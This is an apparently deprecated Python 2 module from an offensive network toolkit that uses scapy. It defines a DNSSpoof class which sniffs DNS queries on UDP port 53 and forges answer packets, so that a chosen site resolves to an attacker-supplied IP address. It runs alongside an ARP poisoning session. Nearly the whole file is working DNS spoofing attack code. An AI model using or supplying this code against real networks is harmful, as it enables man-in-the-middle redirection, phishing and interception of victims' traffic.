import stream
from scapy.all import *
from threading import Thread

#
# DEPRICATED; NOW A PART OF ARPSPOOF
#
class DNSSpoof:
	def __init__(self):
		conf.verb = 0
		self.spoofing = False
		self.spoof_site = ''
		self.redirect_to = ''
		self.dump_data = False

	#
	#
	#
	def shutdown(self):
		if not self.spoofing:
			return
		print '[dbg] initiating DNS shutdown'
		self.spoofing = False
		# we dont save the real DNSRR because we never actually send the DNSQR (tehe), 
		# so we can't really rectify the attack.  Maybe we'll make the request for the user in
		# the future to preserve it.  TODO
		print '[dbg] DNS shutdown complete.'
		return True
	
	#
	#
	#
	def dns_stopper(self):
		if self.spoofing:
			return False
		return True

	#
	# Initialize spoofing by gathering some information
	#
	def initialize(self):
		try:
			print '[!] Note: You should have an existing poisoning session running for this to work!'
			self.spoof_site = raw_input('[!] Enter DNS record to spoof (site): ')
			# it's the little things, you know?
			self.redirect_to = raw_input('[!] Spoof DNS entry for %s to: '%self.spoof_site)
			tmp =raw_input('[!] Spoof DNS record for %s to %s.  Is this correct? '%(self.spoof_site,self.redirect_to))
		except Exception, j:
			print '[error]: ', j
			return None
		if tmp == 'n':
			return None
		self.spoofing = True
		print '[dbg] starting DNS poisoner...' 
		dns_thread = Thread(target=self.spoof_handler)
		dns_thread.start()
		print '[dbg] poisoner running.'
		# since we're poisoning all DNS requests coming through, just post up the redirection IP
		return self.redirect_to
	
	#
	#
	#
	def respoofer(self, pkt):
		if DNSQR in pkt:
			if self.dump_data: print '[!] DNSQR from ', pkt[DNSQR].qname
			if self.spoof_site == pkt[DNSQR].qname:
				p = IP(src=pkt[IP].dst, dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport,sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id,qr=1L,rd=1L,ra=1L,an=DNSRR(rrname=pkt[DNS].qd.qname,type='A',rclass='IN',ttl=20000,rdata=self.redirect_to),qd=pkt[DNS].qd)
#	p = IP(src=pkt[IP].dst, dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id)/DNSQR(qname=pkt[DNSQR].qname,qtype=pkt[DNSQR].qtype,qclass=pkt[DNSQR].qclass)/DNSRR(rdata=self.redirect_to)
				send(p)
		del(pkt)
	
	#
	#
	#
	def spoof_handler(self):
		sniff(filter="udp and port 53", store=0,prn=self.respoofer, stopper=self.dns_stopper, stopperTimeout=3)
	#
	# Return whether or not the spoofer is running
	#
	def isRunning(self):
		return self.spoofing is True

	#
	#
	#
	def view(self):
		try:
			while True:
				self.dump_data = True
		except Exception:
			self.dump_data = False
			return
